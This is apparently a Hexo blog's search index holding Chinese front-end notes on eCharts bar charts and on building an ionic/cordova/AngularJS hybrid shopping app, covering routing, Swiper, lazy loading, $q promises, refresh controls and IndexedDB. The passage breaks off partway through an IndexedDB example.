<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[个人技能]]></title>
    <url>%2F2018%2F05%2F23%2F%E4%B8%AA%E4%BA%BA%E6%A0%87%E7%AD%BE%2F</url>
    <content type="text"></content>
      <categories>
        <category>个人技能</category>
      </categories>
      <tags>
        <tag>Node.js</tag>
        <tag>Express</tag>
        <tag>EJS</tag>
        <tag>Ajax</tag>
        <tag>BOM</tag>
        <tag>CSS3</tag>
        <tag>AngularJS</tag>
        <tag>DOM</tag>
        <tag>CSS</tag>
        <tag>HTML5</tag>
        <tag>http</tag>
        <tag>JSON</tag>
        <tag>Cookie</tag>
        <tag>Session</tag>
        <tag>MySQL</tag>
        <tag>小项目</tag>
        <tag>Underscore</tag>
        <tag>mine</tag>
        <tag>PHP</tag>
        <tag>tools</tag>
        <tag>browser</tag>
        <tag>Gulp</tag>
        <tag>React</tag>
        <tag>canvas</tag>
        <tag>eCharts</tag>
        <tag>Bower</tag>
        <tag>js</tag>
        <tag>模块化</tag>
        <tag>jQuery</tag>
        <tag>ionic</tag>
        <tag>cordova</tag>
        <tag>正则</tag>
        <tag>npm</tag>
        <tag>nrm</tag>
        <tag>nvm</tag>
        <tag>表单</tag>
        <tag>HTML</tag>
        <tag>MongoDB</tag>
        <tag>RequireJS</tag>
        <tag>SeaJs</tag>
        <tag>blog</tag>
        <tag>git</tag>
        <tag>github</tag>
        <tag>hexo</tag>
        <tag>Grunt</tag>
        <tag>markdown</tag>
        <tag>net</tag>
        <tag>network</tag>
        <tag>webpack</tag>
        <tag>artTemplate</tag>
        <tag>ps</tag>
        <tag>sublime</tag>
        <tag>webstorm</tag>
        <tag>vs code</tag>
        <tag>svn</tag>
        <tag>eclipse</tag>
        <tag>命令行</tag>
        <tag>库</tag>
        <tag>性能优化</tag>
        <tag>数据库</tag>
        <tag>框架</tag>
        <tag>面向对象</tag>
        <tag>交互</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[eCharts 的 bar 系列]]></title>
    <url>%2F2017%2F11%2F11%2FeCharts%20%E7%9A%84%20bar%20%E7%B3%BB%E5%88%97%2F</url>
    <content type="text"><![CDATA[eCharts bar 系列的配置在整个过程中踩了很多的坑，不知道是什么原因，barWidth 设置的宽度过大时会使得两个重叠的 bar 系列的宽度不相同，如若有人发现问题所在，欢迎指正。 html中引入指令1&lt;div data-e-charts data-config="identityData" style="height:200px"&gt;&lt;/div&gt; directive.js 参见官网配置 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768angular.module('myApp') .directive('eCharts', ['app', '$rootScope', function (app, $rootScope) &#123; ... bar: &#123; grid: &#123; top: 12, left: 16, right: '-12%', bottom: 0, containLabel: true &#125;, yAxis: &#123; data: [] &#125;, series: [], init: function () &#123; this.yAxis.data = []; var sum = 0, i, j; for (i = 0; i &lt; this.data.length; i++) &#123; this.yAxis.data.push(this.data[i].name); sum += this.data[i].value; &#125; // 背景系列 bar this.series[0] = &#123;&#125;; this.series[0].type = 'bar'; this.series[0].itemStyle = &#123;normal: &#123;color: 'grey'&#125;, emphasis: &#123;color: 'grey'&#125;&#125;; this.series[0].silent = true; this.series[0].barWidth = 18; this.series[0].barGap = '-100%'; this.series[0].data = []; for (j = 0; j &lt; this.data.length; j++) &#123; this.series[0].data.push(sum); &#125; // 实际数据 bar this.series[1] = &#123;&#125;; this.series[1].type = 'bar'; this.series[1].barWidth = 18; this.series[1].z = 5; this.series[1].data = this.data; for (j = 0; j &lt; this.color.length; j++) &#123; // 每条 bar 的颜色 this.series[1].data[j].itemStyle = &#123; normal: &#123;color: this.color[j]&#125;, emphasis: &#123;color: this.color[j]&#125; &#125;; this.series[1].label = &#123; normal: &#123; show: true, position: 'right', offset: [5, -2], formatter: function (p) &#123; var ratio = Math.round(p.value / sum * 100); return p.value + ' ( ' + ratio + '%' + ' ) '; &#125; &#125;, emphasis: &#123;&#125; &#125;; &#125; ... &#125; &#125; return &#123; scope: &#123;config: '='&#125;, link: function (scope, element) &#123; ... &#125; &#125;; &#125;]); controller.js123456789101112131415161718$scope.identityData = &#123; type: 'bar', data: [], color: ['red', 'orange', 'green', 'green']&#125;;// 获取数据$scope.getIdentityData = function () &#123; $http(&#123; url:'/test/testData/identity', method:'GET' &#125;).success(function(data, header, config, status) &#123; //响应成功 $scope.identityData = data; &#125;).error(function(err) &#123; //处理响应失败 console.log(err); &#125;);&#125;; data.js12345678module.exports = &#123; identity: [ &#123;name: &apos;我爱你&apos;, value: 12&#125;, &#123;name: &apos;我爱他&apos;, value: 34&#125;, &#123;name: &apos;他爱你&apos;, value: 79&#125;, &#123;name: &apos;你爱他&apos;, value: 23&#125; ]&#125;]]></content>
      <categories>
        <category>eCharts 系列</category>
      </categories>
      <tags>
        <tag>AngularJS</tag>
        <tag>eCharts</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ionic+cordova+AngularJS混合app开发笔记]]></title>
    <url>%2F2017%2F10%2F10%2Fionic%2Bcordova%2BAngularJS%E6%B7%B7%E5%90%88app%E5%BC%80%E5%8F%91%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[ionic 项目安装项目依赖 已在环境配置里面设置好 打开命令窗口,在搜索中输入cmd输入npm install cordova ionic -g 快速创建项目 先找到一个放项目的位置在目录中按住 shift 键右击,在当前文件夹打开命令窗口ionic start myApp (默认是tab样式) 项目结构说明12345678|-- hooks|-- platform 手机平台|-- plugins cordova 插件库|-- resources 图片资源|-- scss|-- www 项目资源|-- .bowerrc bower 配置文件... 打包app 先找到项目的根目录在目录中按住shift键右击,在当前文件夹打开命令窗口Ionic platform add androidIonic build android 项目结构搭建要从新整理结构方便运维，结构清晰，方便查找方便团队开发 抽取步骤控制项目启动的 app.js 控制路由跳转的 route.js 控制全局变量的 global.js 控制不同平台兼容性的 config.js 功能模块划分Controller：业务逻辑 Factory:数据请求访问，和服务器进行操作。 Html页面：功能界面 Route:子功能路由js，控制我们的页面跳转。 外面四个js实现步骤创建四个控制全局功能的js文件 把每个js文件变成模块 app：runconfig: configglobal: constantroute: config 把js文件在html中引入 在app.js 文件中注入我们其他三个模块的东西（加入功能） app.js1234567891011121314151617181920212223242526272829303132333435// Ionic Starter Appangular.module('starter', ['ionic','config','global','route','ionicLazyLoad','indexdb','commonJs','ngCordova']).run(function($ionicPlatform,$location,$ionicHistory,$cordovaToast,$rootScope) &#123; $ionicPlatform.ready(function() &#123; if (window.cordova &amp;&amp; window.cordova.plugins &amp;&amp; window.cordova.plugins.Keyboard) &#123; cordova.plugins.Keyboard.hideKeyboardAccessoryBar(true); cordova.plugins.Keyboard.disableScroll(true); &#125; if (window.StatusBar) &#123; // org.apache.cordova.statusbar required StatusBar.styleDefault(); &#125; // 给android的物理返回按钮添加点击事件 // 第一个参数是注册的事件，第二个参数是注册事件的优先级 $ionicPlatform.registerBackButtonAction(function(e)&#123; if($rootScope.backButtonPressedOnceToExit)&#123; ionic.Platform.exitApp(); &#125; else &#123; if($location.path()=="/tab/home"||$location.path()=="/tab/category"||$location.path()=="/tab/account"||$location.path()=="/tab/cart")&#123; $rootScope.backButtonPressedOnceToExit=true; $cordovaToast.showShortBottom('再点一次退出！'); setTimeout(function()&#123; $rootScope.backButtonPressedOnceToExit=false; &#125;,2000) &#125; else &#123; $ionicHistory.goBack(); &#125; &#125; e.preventDefault(); return false &#125;,110); &#125;);&#125;); route.js通过 angular.module.config 方法定义路由 引入 $stateProvider(), $urlRouterProvider 就是根据浏览器url地址后面 # 部分后面你的变化匹配不同的路由，匹配到合适的路由之后，就会把 templateUrl 中写得页面模板渲染到我们页面中的&lt;ion-vav-view&gt;,如果页面中有很多的&lt;ion-nav-view&gt;组件，他就会根据组件中的name属性的值进行选择渲染。Controller属性中的控制器会被自动渲染到模板页面中，变为ng-controller=&quot;控制器名称&quot;。 1234567891011121314151617181920angular.module('route', [ 'guidePage.route', 'tab.route', 'home.route', 'category.route', 'goodsList.route', 'details.route', 'cart.route', 'account.route']) .config(function($stateProvider, $urlRouterProvider) &#123; // 第一次登陆 if(localStorage["isFirst"]) &#123; $urlRouterProvider.otherwise('/tab/home'); &#125; else &#123; $urlRouterProvider.otherwise('/guidePage'); &#125; &#125;); Global.Js通过 angular.module.constant 定义成模块，不经常改变的东西放在这里面。 如果要使用，在其他模块中注入服务就可以了，比如 GlobalVariable，在其他模块中就可以把里面的属性都点出来。 12345678// 全局变量模块angular.module('global', []) .constant("GlobalVariable",&#123; 'HTTP': 'https', 'SERVER_PATH':'http://192.168.1.1',// 服务器地址 'VERSION':"0.0.1", 'PORT':'8080' &#125;); Config.js通过 angular.module.config 定义成模块 注入 $ionicConfigProvider 服务 123456789101112131415161718// 配置模块，控制不同平台的兼容性angular.module('config', []) .config(function($ionicConfigProvider)&#123; $ionicConfigProvider.platform.android.tabs.position("bottom"); $ionicConfigProvider.platform.ios.tabs.position("bottom"); //$ionicConfigProvider.platform.ios.tabs.style('standard'); //$ionicConfigProvider.platform.ios.tabs.position('bottom'); //$ionicConfigProvider.platform.android.tabs.style('standard'); //$ionicConfigProvider.platform.android.tabs.position('bottom'); //$ionicConfigProvider.platform.ios.navBar.alignTitle('center'); //$ionicConfigProvider.platform.android.navBar.alignTitle('center'); // //$ionicConfigProvider.platform.ios.backButton.previousTitleText('').icon('ion-ios-arrow-thin-left'); //$ionicConfigProvider.platform.android.backButton.previousTitleText('').icon('ion-android-arrow-back'); // //$ionicConfigProvider.platform.ios.views.transition('ios'); //$ionicConfigProvider.platform.android.views.transition('android'); &#125;) ng-app --(starter)--&gt; app.js --&gt; 引进其它模块 功能模块 js 的整理步骤1、 创建四个文件 Controller文件：控制业务逻辑的Route文件：功能模块路由Service文件：数据请求访问的Html页面 2、把每个js文件变成模块 Controller: angular.module.controllerroute: angular.moduleconfigservice: angular.modulefactoryroute: angular.moduleconfig 3、把 js 文件在 html 中引入 4、在模块 js 文件中注入需要的服务和模块 总结：页面启动流程： 命名规范 123456789101112131415index &lt;body na-app='starter'&gt; &lt;/body&gt;ionic.bundle.js 文件中有 angular.jsstarter 入口模块'ionic','config','global','route''ionicLazyLoad','indexdb','commonJs','ngCordova'|-- ionic 是 bundle.js 中的内容，是 ionic 框架自定义的|-- congfig 兼容性配置 .config(function($ionicConfigProvider)&#123;&#125;)|-- global constant 的东西执行 .constant("GlobalVariable",&#123;&#125;)|-- route 功能模块的入口文件 .config(function($stateProvider, $urlRouterProvider)&#123;&#125;) |-- guidePage.route .config(function($stateProvider, $urlRouterProvider)&#123;&#125;) |-- guidePage.controller .controller('GuidePageCtrl',function ($scope, $state)&#123;&#125;) |-- guidePage.service .factory('GuidePageFty', function()&#123;&#125;)|-- route 有一个：$urlRouterProvider.otherwise('/guidePage');&lt;ion-nav-view&gt;&lt;/ion-nav-view&gt; 模板页面渲染到了它所在的地方 扩展链接http://ngionic.com/2014/12/ionic-javascript-api-ionicconfigprovider/http://ngionic.com/2014/12/ionic-javascript-api-ion-view-%E8%A7%86%E5%9B%BE%E7%9A%84%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E5%8F%8A%E4%BA%8B%E4%BB%B6%E9%9B%86%E5%90%88/ ionic cssionic js： angular 指令ionic 图标库 路由Ui-router的介绍Github地址：https://github.com/angular-ui/ui-router ui-router 他算是angular中进行路由跳转的一个第三方插件，本质是对 ng-route 进行了一些封装。 通过 npm install angular-ui-router 下载在 index.html 启动页面中引入 js 文件，引入顺序要注意，因为需要 angular 中的 ng-route 的东西，所以要在引入 angular.js文件之后引入。需要引入 ui-router 模块在 html 中的某个标签加上 ui-view 标签，作用就是在页面中挖了一个坑，之后的模板页面就往这里面填。在 js 文件中编写我们的路由。根据浏览器地址栏的变化，匹配不同的路由，然后进行模板页面的渲染和控制器的加载。 抽象路由的实现 为了实现在一个页面中可以出现多个坑（模板页面替换位置），才实现了抽象路由的概念 注意点： 抽象路由是不会被单独匹配渲染的，只有配合子路由的实现才能渲染虚拟路由中的模板子路由中的路由名称中的点是有实际意义的，是为了配合虚拟路由，实现父子路由的层级关系。 ionic中路由实现 在index页面中加入&lt;ion-nav-view&gt;&lt;/ion-nav-view&gt;标签，在 ionic 中 ui-router 的 ui-view 已经被&lt;ion-nav-view&gt;组件封装了，所以不会出现在页面中。要写路由模块的配置信息，通过angular.module.config配置路由信息（设置路由名称，url地址，模板页面，controller）在index.html页面把路由js引进来，在app.js中注入路由模块的功能把页面的功能包裹在ion-view或者是ion-tab标签中根据浏览器中url地址的变化，匹配不同的路由渲染我们的模板页面到相应的&lt;ion-nav-view&gt;&lt;/ion-nav-view&gt;组件中 tab_router.js1234567891011angular.module('tab.route', ['tab.controller']) .config(function($stateProvider, $urlRouterProvider) &#123; $stateProvider .state('tab', &#123; url: '/tab', // 抽象路由 abstract: true, templateUrl: 'areas/tab/tab.html', controller: 'TabCtrl' &#125;) &#125;); home_route.js12345678910111213angular.module('home.route', ['home.controller']) .config(function ($stateProvider, $urlRouterProvider) &#123; $stateProvider .state('tab.home', &#123; url: '/home', views: &#123; 'tab-home': &#123; templateUrl: 'areas/home/home.html', controller: 'HomeCtrl' &#125; &#125; &#125;) &#125;); . 是有实际意义的：表明是抽象路由的子路由。 此时的路由就是：/tab/home route.js12345678910angular.module(&apos;route&apos;, [ &apos;guidePage.route&apos;, &apos;tab.route&apos;, &apos;home.route&apos;, &apos;starter.controllers&apos;, &apos;starter.services&apos;]).config(function($stateProvider, $urlRouterProvider) &#123; $urlRouterProvider.otherwise(&apos;/tab/home&apos;); &#125;); index.html12345678910&lt;!--tab切换--&gt;&lt;script src="areas/tab/tab_controller.js"&gt;&lt;/script&gt;&lt;script src="areas/tab/tab_route.js"&gt;&lt;/script&gt;&lt;!--首页--&gt;&lt;script src="areas/home/home_controller.js"&gt;&lt;/script&gt;&lt;script src="areas/home/home_route.js"&gt;&lt;/script&gt;&lt;script src="areas/home/home_service.js"&gt;&lt;/script&gt;&lt;body ng-app="starter"&gt; &lt;ion-nav-view&gt;&lt;/ion-nav-view&gt;&lt;/body&gt; 这样现在页面就有四个坑了。 引导页的实现创建引导页步骤 创建四个功能模块文件编写模块功能，（这里从之前的代码复制 html 页面和 css 样式）在 index.html 页面中引入三个文件(controller, route, service)将功能路由在总路由中注入 Swiper简介及用法官网：http://www.swiper.com.cn/ Swiper是纯javascript打造的滑动特效插件，面向手机、平板电脑等移动终端。 Swiper能实现触屏焦点图、触屏Tab切换、触屏多图切换等常用效果。 Swiper开源、免费、稳定、使用简单、功能强大，是架构移动终端网站的重要选择 1.首先创建一个swiper的运行环境，需要用到的文件有swiper.min.js和swiper.min.css文件。 1234567891011&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; ... &lt;link rel="stylesheet" href="path/to/swiper.min.css"&gt; &lt;/head&gt; &lt;body&gt; ... &lt;/body&gt; &lt;script src="path/to/swiper.min.js"&gt;&lt;/script&gt;&lt;/html&gt; 2.写HTML内容。 12345678910&lt;div class="swiper-container"&gt; &lt;div class="swiper-wrapper"&gt; &lt;div class="swiper-slide"&gt;Slide 1&lt;/div&gt; &lt;div class="swiper-slide"&gt;Slide 2&lt;/div&gt; &lt;div class="swiper-slide"&gt;Slide 3&lt;/div&gt; &lt;/div&gt; &lt;!-- 如果需要分页器 --&gt; &lt;div class="swiper-pagination"&gt;&lt;/div&gt;&lt;/div&gt; 3.你可能想要给Swiper定义一个大小，当然不要也行。1234.swiper-container &#123; width: 600px; height: 300px;&#125; 4.初始化Swiper：最好是挨着标签 （函数调用） 12345678910111213&lt;script&gt; var swiper=new Swiper('.swiper-container',&#123; autoplay:1000,//自动轮播 autoplayDisableOnInteraction:false,//滑动后继续滚动 loop:true,//循环 pagination:'.swiper-pagination',//分页 paginationClickable:true,//小圆点点击 spaceBetween:30,//图片间隙 direction:"horizontal"//默认横向 vertical垂直 &#125;)&lt;/script&gt;&lt;/body&gt; 使用swiper步骤 在任意一个位置打开开命令窗口，输入 npm install bower –g在项目根目录打开命令窗口，输入 bower install swiper –save在 index.html 页面引入 swiper.min.css，swiper.min.js把页面中的 html 代码加上对应的 class 样式在 controller 中初始化 swiper 插件，并设置相应的属性 首页的实现项目布局改造创建四个首页面功能文件,修改里面的内容 在 index 页面引入四个文件 在总路由中注入子功能路由，controller, service 也都要在子功能路由中注入 Tab模板改造 对 ion-tabs 里面变为四个 ion-tab s组件对四个 ion-tab 组件的名称，图标，跳转地址进行了修改，ion-nav-view 组件的 name 属性改掉把 tabs 的抽象路由给抽取了出来，变为一个功能模块在 index 页面中引入 tabs 的相关文件在总路由中注入 tabs.route 模块 动态生成swiper 在controller中模拟请求后台数据，把请求回来的数据放到$scope上在html页面中通过ng-repeat指令循环生成slider滑动页初始化swiper对象，注意最好把observeParents，observer这两个属性设置为true.要注意初始化swiper的时间，最好放在$ionicView.afterEnter中 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=no, width=device-width"&gt; &lt;title&gt;&lt;/title&gt; &lt;!--公共css--&gt; &lt;link href="lib/ionic/css/ionic.css" rel="stylesheet"&gt; &lt;link href="css/common.css" rel="stylesheet"&gt; &lt;!--功能模块css--&gt; &lt;link href="css/guidePage/guidePage.css" rel="stylesheet"&gt; &lt;link href="css/home/home.css" rel="stylesheet"&gt; &lt;link href="css/category/category.css" rel="stylesheet"&gt; &lt;link href="css/goodsList/goodsList.css" rel="stylesheet"&gt; &lt;link href="css/details/details.css" rel="stylesheet"&gt; &lt;link href="css/cart/cart.css" rel="stylesheet"&gt; &lt;link href="css/account/account.css" rel="stylesheet"&gt; &lt;link href="lib/Swiper/dist/css/swiper.css" rel="stylesheet"&gt; &lt;!-- ionic/angularjs js --&gt; &lt;script src="lib/ionic/js/ionic.bundle.js"&gt;&lt;/script&gt; &lt;!-- cordova script (this will be a 404 during development) --&gt; &lt;script src="cordova.js"&gt;&lt;/script&gt; &lt;!-- 全局js文件 --&gt; &lt;script src="js/app.js"&gt;&lt;/script&gt; &lt;script src="js/route.js"&gt;&lt;/script&gt; &lt;script src="js/global.js"&gt;&lt;/script&gt; &lt;script src="js/config.js"&gt;&lt;/script&gt; &lt;script src="areas/common/indexdb.js"&gt;&lt;/script&gt; &lt;script src="areas/common/common.js"&gt;&lt;/script&gt; &lt;!--功能模块js--&gt; &lt;script src="areas/guidePage/guidePage_controller.js"&gt;&lt;/script&gt; &lt;script src="areas/guidePage/guidePage_route.js"&gt;&lt;/script&gt; &lt;script src="areas/guidePage/guidePage_service.js"&gt;&lt;/script&gt; &lt;script src="areas/tab/tab_controller.js"&gt;&lt;/script&gt; &lt;script src="areas/tab/tab_route.js"&gt;&lt;/script&gt; &lt;script src="areas/home/home_controller.js"&gt;&lt;/script&gt; &lt;script src="areas/home/home_route.js"&gt;&lt;/script&gt; &lt;script src="areas/home/home_service.js"&gt;&lt;/script&gt; &lt;script src="areas/category/category_controller.js"&gt;&lt;/script&gt; &lt;script src="areas/category/category_route.js"&gt;&lt;/script&gt; &lt;script src="areas/category/category_service.js"&gt;&lt;/script&gt; &lt;script src="areas/goodsList/goodsList_controller.js"&gt;&lt;/script&gt; &lt;script src="areas/goodsList/goodsList_route.js"&gt;&lt;/script&gt; &lt;script src="areas/goodsList/goodsList_service.js"&gt;&lt;/script&gt; &lt;script src="areas/details/details_controller.js"&gt;&lt;/script&gt; &lt;script src="areas/details/details_service.js"&gt;&lt;/script&gt; &lt;script src="areas/details/details_route.js"&gt;&lt;/script&gt; &lt;script src="areas/cart/cart_controller.js"&gt;&lt;/script&gt; &lt;script src="areas/cart/cart_service.js"&gt;&lt;/script&gt; &lt;script src="areas/cart/cart_route.js"&gt;&lt;/script&gt; &lt;script src="areas/account/account_controller.js"&gt;&lt;/script&gt; &lt;script src="areas/account/account_service.js"&gt;&lt;/script&gt; &lt;script src="areas/account/account_route.js"&gt;&lt;/script&gt; &lt;!--第三方插件js--&gt; &lt;script src="lib/Swiper/dist/js/swiper.js"&gt;&lt;/script&gt; &lt;script src="lib/jquery/dist/jquery.js"&gt;&lt;/script&gt; &lt;script src="lib/ionic-image-lazy-load/ionic-image-lazy-load.js"&gt;&lt;/script&gt; &lt;script src="lib/ngCordova/dist/ng-cordova.js"&gt;&lt;/script&gt; &lt;/head&gt; &lt;body ng-app="starter"&gt; &lt;!-- The nav bar that will be updated as we navigate between views. --&gt; &lt;!--&lt;ion-nav-bar class="bar-stable"&gt;--&gt; &lt;!--&lt;ion-nav-back-button&gt;--&gt; &lt;!--&lt;/ion-nav-back-button&gt;--&gt; &lt;!--&lt;/ion-nav-bar&gt;--&gt; &lt;!-- The views will be rendered in the &lt;ion-nav-view&gt; directive below Templates are in the /templates folder (but you could also have templates inline in this html file if you'd like). --&gt; &lt;ion-nav-view&gt;&lt;/ion-nav-view&gt; &lt;/body&gt;&lt;/html&gt; ion-view 的生命周期 ionic中清理缓存的四种方法http://ionicframework.com/docs/api/directive/ionNavView/ 延迟加载的实现Imagelazyload:http://www.cnblogs.com/cloudgamer/archive/2010/03/03/ImagesLazyLoad.html jquery.lazyload不能在ionic中使用:http://www.cnblogs.com/yzg1/p/5051554.html angular中实现延迟加载http://segmentfault.com/q/1010000002730440?_ea=192608 me-lazyimghttps://github.com/Treri/me-lazyimg/blob/master/me-lazyimg.js angular-imglazyloadhttps://www.npmjs.com/package/angular-imglazyload ionic-image-lazy-load（专门的 ionic 图片延迟加载插件）https://github.com/paveisistemas/ionic-image-lazy-load 延迟加载插件使用步骤用 bower 进行下载 1$ bower install ion-image-lazy-load --save 在 index 页面中引入 ion-image-lazy-load.js 文件 在 app.js 中注入 ionicLazyLoad 服务 在 ion-content 组件上加上 lazy-scroll 指令，注意 lazy-scroll 指令只能作用于 Ionic-content 组件上。 把滚动容器中所有 img 标签的 src 属性替换为 image-lazy-src ionic中的页面跳转和参数传递ionic中的路由跳转方式通过代码的方式进行跳转 （1）在 controller 里面注入 $state 服务 （2）在页面中给单击按钮增加单击事件（3）在事件方法里面调用 $state.go(“路由名称”) 通过 href 属性进行跳转 注意：写我们跳转的锚记，url地址进行跳转 通过ui-sref属性进行跳转 第一种方式在 js 代码里，比如单击事件中，第二种得拼接 #，第三种直接定义路由名称就可以了。 ionic中的参数传递先修改路由，在路由中加上参数 将参数进行传递 （1）ui-sref：ui-sref=”goodsList({typeNumber:1})”（2）http://my.oschina.net/u/1416844/blog/470741 1&lt;a href="#/goodsList/34"&gt;跳转到商品详细页面&lt;/a&gt; （3）代码跳转 1$state.go('goodsList', &#123;typeNumber:666&#125;); 在 controller 里面注入 $stateParams 服务，是一个参数对象 其他：用 LoaclStorage 传递参数。 数据请求Angular中的service(父级概念)包含Service,Factory,Provider三个子级概念，都是返回service（父级概念）对象 三种概念定义模块的使用场景 Factory:返回一个匿名对象，匿名对象中是方法的集合Service:在一个模块中返回多个服务，适合用service创建模块Provider：是service的底层实现，angular本身的东西，提供的服务 $http服务使用$http使用简介http://www.2cto.com/kf/201506/405137.html 在Factory中注入$http服务 请求使用 $http服务的跨域请求访问 $q服务$q服务的使用：http://blog.csdn.net/renfufei/article/details/19174015 $q 服务使用步骤： 首先要子啊factoruy中注入$q服务 在Factory中使用 在controller中使用 上一个操作的输入时下一个操作的输入 Promise/A+规范Promise/A+规范简介http://www.jb51.net/article/50725.htm Es6中的promise规范http://web.jobbole.com/85297/ Promise的实现因为他只是一个规范，所以在不同的框架或者平台下有不同的实现 Angular：$q服务Node：q模块，co，thenEs6: Promise, yieldEs7：async await 规范出现的原因我们不知道异步请求什么时候返回数据，所以我们就需要些回调函数。但是在某些情况下我们需要知道数据是在什么时候返回的，然后进行一些处理。 当我们在异步回调里面处理的操作还是异步操作的时候，这样就形成了异步回调的嵌套 正是为了杜绝以上两种情况的出现，社区出现了 Promise/a+ 规范 总结 Promise/a+出现就是为了解决异步深层嵌套Promise/a+本质就是改变了一种书写格式 规范的内容是什么（重要）不管进行什么操作都返回一个 promise 对象，这个对象里面会有一些属性和方法（这个效果类似于 jquery 中的链式编程，返回自己本身） 这个promise有三种状态 Unfulfilled（未完成，初始状态）Fulfilled（已完成）Failed（失败、拒绝） 3、这个promise对象的使用时通过then方法进行的调用 原理图 怎么对promise对象的状态进行改变那通过 $q 服务的 deffer 方法定义出来一个延迟对象。 这个延迟对象都有三个方法 resolved方法：当数据请求成功的时候调用，参数是成功返回的数据对象，把 promise 对象 Unfulfilled 状态改为 fulfilled 状态。rejected方法：当数据请求失败的时候调用，参数是失败的原因，把 promise 对象 Unfulfilled 状态改为 failed 状态。怎么知道在 promise 中调用哪个回调函数，是通过 promise 对象的状态进行判断的。 Promise/A+规范表现形式1、可以通过链式编程的方式对异步操作进行同级处理2、上一个操作的输出值是下一个操作的输入值 完整使用说明$http 配合 $q 的使用 12345678910111213141516171819angular.module("goodsList.service", []) .factory("GoodsListFty", function ($http, $q) &#123; return &#123; refreshData: function (typeNumber) &#123; // 1.创建一个延迟对象 var deferred = $q.defer(); $http.get('data.json').success(function (data, header, config, status) &#123; // 2. 当请求成功的时候用 resolve 方法请求数据 deferred.resolve(data); console.log(deferred); &#125;).error(function (reason, header, config, status) &#123; // 3. 当请求失败的时候用 reject 方法处理失败原因 deferred.reject(reason); &#125;); // 4. 返回 promise 对象 return deferred.promise; &#125; &#125;; &#125;); 在controller中使用 1234567891011// 商品列表控制器angular.module("goodsList.controller", ["goodsList.service"]) .controller("GoodsListCtrl", function ($scope, $stateParams, GoodsListFty) &#123; var promise = GoodsListFty.refreshData($stateParams.typeNumber); // 用 then 方法调用数据 promise.then(function (data) &#123; console.log(data); &#125;).catch(function (reason) &#123; console.log(reason); &#125;); &#125;); 下拉刷新中文文档：http://www.ionic.wang/js_doc-index-id-25.html ion-refresher 介绍ion-refresher: 必须在 ion-content 标签里面使用，而且必须紧挨着 ion-content 标签。 使用介绍? 添加ion-refersher标签，然后配置里面的属性实现获取数据触发的方法在获取数据完毕后停止广播 上拉加载更多http://www.ionic.wang/js_doc-index-id-29.html ion-infinite-scroll 介绍必须在 ion-content 标签里面使用，而且必须紧挨着 ion-content 标签。在底部。 使用介绍 添加ion-infinite-scroll标签，然后配置里面的属性实现获取数据触发的方法在获取数据完毕后停止广播 $emit.$onhttp://www.tuicool.com/articles/qIBNve 生命周期的问题如果在 enter 时间中执行刷新方法，会报错，数据还没有出来，可是页面已经渲染，加载更多的距离大于 1% 所以会一直执行 123$scope.$on('$ionicView.enter', function (e) &#123; $scope.func_refreshGoodsList();&#125;); 所以我们要放在beforeEnter事件中执行 123$scope.$on('$ionicView.beforeEnter', function (e) &#123; $scope.func_refreshGoodsList();&#125;); 没有数据提示问题要添加没有数据的提示，在刷新和加载的方法里面要对返回来的 result 数据进行非空判断，然后修改 pms_isMoreItemsAvailable 的值 123&lt;div ng-hide="pms_isMoreItemsAvailable" style="text-align: center"&gt; &lt;span&gt;我去，地主家也没有余粮啊！&lt;/span&gt;&lt;/div&gt; 循环加载的问题通过 ng-if 方法来控制加载更多的无限循环，默认 pms_isMoreItemsAvailable=true 12&lt;ion-infinite-scroll ng-if="pms_isMoreItemsAvailable" on-infinite="func_loadMoreGoodsList()" distance="1%"&gt;&lt;/ion-infinite-scroll&gt; 遮罩层 123$ionicLoading.show(&#123; template: "正在载入数据，请稍后..."&#125;); 在广播完毕之后执行取消遮罩层 123setTimeout(function()&#123; $ionicLoading.hide();&#125;,1000); IndexedDb简介indexedDB 是 HTML5-WebStorage 的重要一环，是一种轻量级 NOSQL 数据库。相比 web sql(sqlite) 更加高效，包括索引、事务处理和健壮的查询功能。 和 webSQL 的比较 允许快速索引和搜索的对象，所以在 HTML5 的 web 应用程序中，可以有效管理你的数据和高效率的读/写操作。W3C主推的离线数据库类型，逐渐替代 Web SQL 类型数据库，更新效率高并不断完善。工作在异步模式下执行每步操作。使用高效率的的 JavaScript 事件驱动模块 操作 indexedDB原理代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;indexedDB 使用&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;script&gt; // 获取indexdb对象,为了兼容性的写法 // 1、获取对象 window.indexedDB = window.indexedDB || window.mozIndexedDB || window.webkitIndexedDB || window.msIndexedDB; window.IDBTransaction = window.IDBTransaction || window.webkitIDBTransaction || window.msIDBTransaction; window.IDBKeyRange = window.IDBKeyRange || window.webkitIDBKeyRange || window.msIDBKeyRange; window.IDBCursor = window.IDBCursor || window.webkitIDBCursor || window.msIDBCursor; // 2、定义数据库的基本信息 var dbInfo = &#123; dbName: 'aptdb', dbVersion: 2021, //用小数会四舍五入，版本号只能越来越大 dbInstance: &#123;&#125; &#125;; // 3、创建数据库 var dbContent = window.indexedDB.open(dbInfo.dbName, dbInfo.dbVersion); // 判断数据库版本号是否更新，更加 dbversion 和 dbname 去判断，如果没有发送变化，就不走这个回调方法（创建和修改表结构在这里操作） // 如果数据库名称和版本号相同，那么该方法只执行一次 dbContent.onupgradeneeded = function (e) &#123; console.log(e); // 4、创建数据库 store(表) var _db = e.target.result; // 保存表名称的一个数组 var storeNames = _db.objectStoreNames; if (!storeNames.contains("cart")) &#123; // 创建一个表结构，第一个参数是表名称 _db.createObjectStore("cart", &#123; // 必须有个 keyPath 属性，这个属性的值必须是能唯一标识这条数据的值的字段 keyPath: "goodsId", //相当于关系型数据库中的主键 autoIncrement: true &#125;); &#125; &#125;; // 